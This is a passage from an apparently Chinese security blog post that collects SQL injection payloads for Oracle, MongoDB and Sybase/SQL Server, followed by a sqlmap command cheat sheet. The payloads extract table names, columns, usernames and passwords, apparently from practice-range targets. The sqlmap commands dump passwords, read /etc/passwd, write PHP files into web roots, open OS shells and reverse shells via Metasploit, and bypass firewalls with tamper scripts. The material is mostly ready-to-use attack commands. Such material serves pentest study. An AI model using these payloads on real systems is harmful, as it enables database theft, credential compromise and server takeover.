+<p><code>union select &#39;1&#39;,(select table_name from user_tables where rownum=1 and table_name not in &#39;LOGMNR_SESSION_EVOLVE$&#39;) from dual</code></p>
+<p><code>union select &#39;1&#39;,(select table_name from user_tables where rownum=1 and table_name like &#39;%user%&#39;) from dual</code></p>
+<p><strong>4.查询获取列名</strong></p>
+<p><code>union select &#39;1&#39;,(select column_name from user_tab_columns where rownum=1 and table_name=&#39;sns_users&#39;) from dual</code></p>
+<p><code>union select &#39;1&#39;,(select column_name from user_tab_columns where rownum=1 and table_name=&#39;sns_users&#39; and column_name not in &#39;USER_NAME&#39;)  from dual</code></p>
+<p><strong>5.获取指定表名列名数据</strong></p>
+<p><code>union select user_name,user_pwd from &quot;sns_users&quot;</code></p>
+<p><code>union select user_name,user_pwd from &quot;sns_users&quot; where user_name&lt;&gt;&#39;hu&#39;</code></p>
+<p><code>union select user_name,user_pwd from &quot;sns_users&quot; where user_name=&#39;mozhe&#39;</code></p>
+<h1 id="Mongodb注入"><a href="#Mongodb注入" class="headerlink" title="Mongodb注入"></a>Mongodb注入</h1><h2 id="介绍-4"><a href="#介绍-4" class="headerlink" title="介绍"></a>介绍</h2><p>Mongodb以json形式传参，所以注入的时候需要根据code来分析</p>
+<h2 id="注入语法-2"><a href="#注入语法-2" class="headerlink" title="注入语法"></a>注入语法</h2><p><strong>1.获取回显数字</strong></p>
+<p><code>&#39;&#125;); return (&#123;title:1,content:&#39;2</code></p>
+<p><strong>2.爆库</strong></p>
+<p>db返回的是数组，库名，需要用tojson转换为字符串</p>
+<p><code>&#39;&#125;); return (&#123;title:tojson(db),content:&#39;2</code></p>
+<p><strong>3.爆表</strong></p>
+<p>db.getCollectionNames()返回的是数组，需要用tojson转换为字符串</p>
+<p><code>&#39;&#125;); return (&#123;title:tojson(db.getCollectionNames()),content:&#39;2</code></p>
+<p><strong>4.爆列及数据</strong></p>
+<p><strong>db.Authority_confidential</strong>是当前用的集合（表），</p>
+<p>find函数用于查询，0是第一条数据</p>
+<p><code>&#39;&#125;); return (&#123;title:tojson(db.Authority_confidential.find()[0]),content:&#39;1</code></p>
+<p><code>&#39;&#125;); return (&#123;title:tojson(db.Authority_confidential.find()[1]),content:&#39;1</code></p>
+<h1 id="Sybase-Sqlserver注入"><a href="#Sybase-Sqlserver注入" class="headerlink" title="Sybase/Sqlserver注入"></a>Sybase/Sqlserver注入</h1><p><strong>1.猜个数</strong></p>
+<p><code>order by 4</code></p>
+<p><strong>2.猜显位</strong>: <strong>改的位置显示正常则说明该位置为显位</strong></p>
+<p><code>union all select &#39;null&#39;,null,null,null</code></p>
+<p><code>union all select null,&#39;null&#39;,null,null 显示null证明显示位为2</code></p>
+<p><code>union all select null,null,&#39;null&#39;,null</code></p>
+<p><code>union all select null,null,null,&#39;null&#39;</code></p>
+<p><strong>3.猜库名</strong></p>
+<p><code>union all select null,db_name(),null,null</code></p>
+<p><code>union all select null,db_name(1),null,null</code></p>
+<p><code>union all select null,db_name(2),null,null</code></p>
+<p><strong>4.猜表名</strong>：<strong>在数据库名后加上.dbo.sysobjects</strong></p>
+<p><code>union all select null,name,null,null from mozhe_Deepthroat.dbo.sysobjects</code></p>
+<p><code>union all select null,name,null,null from mozhe_Deepthroat.dbo.sysobjects where name&lt;&gt;&#39;Deepthroat_login&#39;</code></p>
+<p><code>union all select null,name,null,null from mozhe_Deepthroat.dbo.sysobjects where name&lt;&gt;&#39;Deepthroat_login&#39; and name&lt;&gt;&#39;notice&#39;</code></p>
+<p><strong>5.猜列名</strong></p>
+<p><code>union all select null,name,null,null from mozhe_Deepthroat.dbo.syscolumns where id=object_id(&#39;Deepthroat_login&#39;)</code></p>
+<p><code>union all select null,name,null,null from mozhe_Deepthroat..syscolumns where id=object_id(&#39;Deepthroat_login&#39;) and name&lt;&gt;&#39;id&#39;</code></p>
+<p><code>union all select null,name,null,null from mozhe_Deepthroat..syscolumns where id=object_id(&#39;Deepthroat_login&#39;) and name&lt;&gt;&#39;id&#39; and name&lt;&gt;&#39;name&#39;</code></p>
+<p><strong>6.获取数据</strong></p>
+<p><code>union all select null,name,null,null from Deepthroat_login</code></p>
+<p><code>union all select null,password,null,null from Deepthroat_login</code></p>
+<p><code>union all select null,password,null,null from Deepthroat_login where name&lt;&gt;&#39;zhang&#39;</code></p>
+<p><code>union all select null,password,null,null from Deepthroat_login where name=&#39;mozhe&#39;</code></p>
+<h1 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h1><h2 id="命令参数"><a href="#命令参数" class="headerlink" title="命令参数"></a>命令参数</h2><p>-u  #注入点 </p>
+<p>-f  #指纹判别数据库类型 </p>
+<p>-b  #获取数据库版本信息 </p>
+<p>-p  #指定可测试的参数(?page=1&amp;id=2 -p “page,id”) </p>
+<p>-D “”  #指定数据库名 </p>
+<p>-T “”  #指定表名 </p>
+<p>-C “”  #指定字段 </p>
+<p>-s “”  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log”　　恢复:-s “xx.log” –resume) </p>
+<p>-r post.txt #把post的内容放在post.txt 直接用这个进行post注入</p>
+<p>–level=(1-5) #要执行的测试水平等级，默认为1 </p>
+<p>–risk=(0-3)  #测试执行的风险等级，默认为1 </p>
+<p>–time-sec=(2,5) #延迟响应，默认为5 </p>
+<p>–data “” #通过POST发送数据 </p>
+<p>–columns        #列出字段 </p>
+<p>–current-user   #获取当前用户名称 </p>
+<p>–current-db     #获取当前数据库名称 </p>
+<p>–users          #列数据库所有用户 </p>
+<p>–passwords      #数据库用户所有密码 </p>
+<p>–privileges     #查看用户权限(–privileges -U root) </p>
+<p>-U               #指定数据库用户 </p>
+<p>–dbs            #列出所有数据库 </p>
+<p>–tables -D “”   #列出指定数据库中的表 </p>
+<p>–columns -T “user” -D “mysql”#列出mysql数据库中的user表的所有字段</p>
+<p>–dump-all            #列出所有数据库所有表 </p>
+<p>–exclude-sysdbs      #只列出用户自己新建的数据库和表 </p>
+<p>–dump -T “” -D “” -C “”   #列出指定数据库的表的字段的数据(–dump -T users -D master -C surname) </p>
+<p>–dump -T “” -D “” –start 2 –top 4  # 列出指定数据库的表的2-4字段的数据 </p>
+<p>–dump -C “ “ #列出指定column的字段</p>
+<p>–dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) </p>
+<p>–os      #指定系统(Linux,Windows) </p>
+<p>-v  #详细的等级(0-6)     0：只显示Python的回溯，错误和关键消息。 </p>
+<p>​    1：显示信息和警告消息。 </p>
+<p>​    2：显示调试消息。 </p>
+<p>​    3：有效载荷注入。 </p>
+<p>​    4：显示HTTP请求。 </p>
+<p>​    5：显示HTTP响应头。 </p>
+<p>​    6：显示HTTP响应页面的内容 </p>
+<p>–privileges  #查看权限 </p>
+<p>–is-dba      #是否是数据库管理员 </p>
+<p>–roles       #枚举数据库用户角色 </p>
+<p>–udf-inject  #导入用户自定义函数（获取系统权限） </p>
+<p>–union-check  #是否支持union 注入 </p>
+<p>–union-cols #union 查询表记录 </p>
+<p>–union-test #union 语句测试 </p>
+<p>–union-use  #采用union 注入 </p>
+<p>–union-tech orderby #union配合order by </p>
+<p>–data “” #POST方式提交数据(–data “page=1&amp;id=2”) </p>
+<p>–cookie “用;号分开”      #cookie注入(–cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) –referer “”     #使用referer欺骗(–referer “http://“) </p>
+<p>–user-agent “”  #自定义user-agent </p>
+<p>–proxy “<a href="http://127.0.0.1:8118&quot;">http://127.0.0.1:8118&quot;</a> #代理注入 </p>
+<p>–string=””    #指定关键词,字符串匹配. </p>
+<p>–threads 　　  #采用多线程(–threads 3) </p>
+<p>–sql-shell    #执行指定sql命令 </p>
+<p>–sql-query    #执行指定的sql语句(–sql-query “SELECT password FROM mysql.user WHERE user = ‘root’ LIMIT 0, 1” ) </p>
+<p>–file-read    #读取指定文件 </p>
+<p>–file-write   #写入本地文件(–file-write /test/test.txt –file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) </p>
+<p>–file-dest    #要写入的文件绝对路径 </p>
+<p>–os-cmd=id    #执行系统命令 </p>
+<p>–os-shell     #系统交互shell </p>
+<p>–os-pwn       #反弹shell(–os-pwn –msf-path=/opt/framework/msf3/) </p>
+<p>–msf-path=    #matesploit绝对路径(–msf-path=/opt/framework/msf3/) </p>
+<p>–os-smbrelay  # </p>
+<p>–os-bof       # </p>
+<p>–reg-read     #读取win系统注册表 </p>
+<p>–priv-esc     # </p>
+<p>–time-sec=    #延迟设置 默认–time-sec=5 为5秒 -p “user-agent” –user-agent “sqlmap/0.7rc1 (<a target="_blank" rel="noopener" href="http://sqlmap.sourceforge.net)&quot;/">http://sqlmap.sourceforge.net)&quot;</a>  #指定user-agent注入 </p>
+<p>–eta          #盲注 /pentest/database/sqlmap/txt/common-columns.txt　　字段字典　　　 </p>
+<p>common-outputs.txt </p>
+<p>common-tables.txt      表字典 </p>
+<p>keywords.txt </p>
+<p>oracle-default-passwords.txt </p>
+<p>user-agents.txt </p>
+<p>wordlist.txt </p>
+<h2 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句 :"></a>常用语句 :</h2><p>1./sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -f -b –current-user –current-db –users –passwords –dbs -v 0 </p>
+<p>2./sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –passwords -U root –union-use -v 2 </p>
+<p>3./sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –dump -T users -C username -D userdb –start 2 –stop 3 -v 2 </p>
+<p>4./sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –dump -C “user,pass”  -v 1 –exclude-sysdbs </p>
+<p>5./sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –sql-shell -v 2 </p>
+<p>6./sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –file-read “c:\boot.ini” -v 2 </p>
+<p>7./sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –file-write /test/test.txt –file-dest /var/www/html/1.txt -v 2 </p>
+<p>8./sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –os-cmd “id” -v 1 </p>
+<p>9./sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –os-shell –union-use -v 2 </p>
+<p>10./sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –os-pwn –msf-path=/opt/framework/msf3 –priv-esc -v 1 </p>
+<p>11./sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –os-pwn –msf-path=/opt/framework/msf3 -v 1 </p>
+<p>12./sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –os-bof –msf-path=/opt/framework/msf3 -v 1 </p>
+<p>13./sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –reg-add –reg-key=”HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap” –reg-value=Test –reg-type=REG_SZ –reg-data=1 </p>
+<p>14./sqlmap.py -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –eta </p>
+<p>15./sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot;">http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot;</a> -p id –prefix “‘)” –suffix “AND (‘abc’=’abc”16./sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot;">http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot;</a> –auth-type Basic –auth-cred “testuser:testpass”17./sqlmap.py -l burp.log –scope=”(www)?.target.(com|net|org)”18./sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot;">http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot;</a> –tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 </p>
+<p>19./sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot;">http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot;</a> –sql-query “SELECT ‘foo’” -v 1 </p>
+<p>20./sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.136.129/mysql/get_int_4.php?id=1&quot;">http://192.168.136.129/mysql/get_int_4.php?id=1&quot;</a> –common-tables -D testdb –banner </p>
+<p>21./sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.136.129/mysql/get_int_4.php?id=1&quot;">http://192.168.136.129/mysql/get_int_4.php?id=1&quot;</a> –cookie=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low” –string=’xx’ –dbs –level=3 -p “uid”简单的注入流程 :</p>
+<p>1.读取数据库版本，当前用户，当前数据库 </p>
+<p>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -f -b –current-user –current-db -v 1 </p>
+<p>2.判断当前数据库用户权限 </p>
+<p>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –privileges -U 用户名 -v 1 </p>
+<p>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –is-dba -U 用户名 -v 1 </p>
+<p>3.读取所有数据库用户或指定数据库用户的密码 </p>
+<p>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –users –passwords -v 2 </p>
+<p>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –passwords -U root -v 2 </p>
+<p>4.获取所有数据库 </p>
+<p>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –dbs -v 2 </p>
+<p>5.获取指定数据库中的所有表 </p>
+<p>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –tables -D mysql -v 2 </p>
+<p>6.获取指定数据库名中指定表的字段 </p>
+<p>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –columns -D mysql -T users -v 2 </p>
+<p>7.获取指定数据库名中指定表中指定字段的数据 </p>
+<p>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –dump -D mysql -T users -C “username,password” -s “sqlnmapdb.log” -v 2 </p>
+<p>8.file-read读取web文件 </p>
+<p>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –file-read “/etc/passwd” -v 2 </p>
+<p>9.file-write写入文件到web </p>
+<p>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –file-write /localhost/mm.php –file使用sqlmap绕过防火墙进行注入测试：</p>
+<h2 id="Tamper使用"><a href="#Tamper使用" class="headerlink" title="Tamper使用"></a>Tamper使用</h2><p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/mark0/p/12349551.html">sqlmap之常用tamper脚本</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_21500173/article/details/53648696">sqlmap 的源码学习笔记一之目录结构</a></p>
+<p><strong>–tamper=xxxx.py</strong> </p>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>–current-user 当前用户<br>–is-dba 是否为管理员<br>–file-read 从服务器读入<br>–file-write 从本地写入<br>–file-dest 写入目标路径<br>–sql-shell 执行 sql命令终端<br>–os-shell 执行 shell终端<br>–os-cmd=ver 自定义命令<br>–os-cmd=OSCMD//执行操作系统命令<br>–os-shell //反弹一个 osshell<br>–os-pwn //pwn，反弹 msf下的 shell或者 vnc<br>–os-smbrelay //反弹 msf下的 shell或者 vnc<br>–os-bof //存储过程缓存溢出<br>–priv-esc //数据库提权<br>–reg-read –reg-add –reg-del –reg-key<br>–reg-value –reg-data –reg-type<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot;">http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot;</a> –file-read “d:/test.txt”<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot;">http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot;</a> –file-write “f:/host.txt” –file-dest “D:/phpstudy/PHPTutorial/WWW/sqlilabs/1.txt” <strong>第一个write是本地的内容，第二个是destination的地址</strong><br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot;">http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot;</a> –sql-shell<br>select * from mysql.user<br>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot;">http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot;</a> –os-shell</p>
+</div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>Leihehe</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://leihehe.top/2021/06/06/%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E9%9B%86%E5%90%88/" title="不同数据库的SQL注入集合">https://leihehe.top/2021/06/06/%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E9%9B%86%E5%90%88/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> 许可协议。</li></ul></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2021/06/11/%E5%85%B3%E4%BA%8E%E6%90%9C%E7%B4%A2%E5%9E%8B%E3%80%81%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8A%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86/" rel="prev" title="关于搜索型、字符型注入以及参数加密"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">关于搜索型、字符型注入以及参数加密</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2021/06/04/Systems-Development-Course-Review/" rel="next" title="Systems Development Course Review"><span class="post-nav-text">Systems Development Course Review</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>说点什么好呢？</span><br></div><style>.utterances {
+  max-width: 100%;
+}</style><script src="https://utteranc.es/client.js" repo="leihehehe/leihehehe.github.io" issue-term="pathname" theme="github-light" crossorigin="anonymous" async></script></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2021 – 2022 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> Leihehe</span></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-search-line"></use></svg></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script src="/js/search/local-search.js" defer></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-close-line"></use></svg></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div id="local-search-result"></div></div></div></body></html>
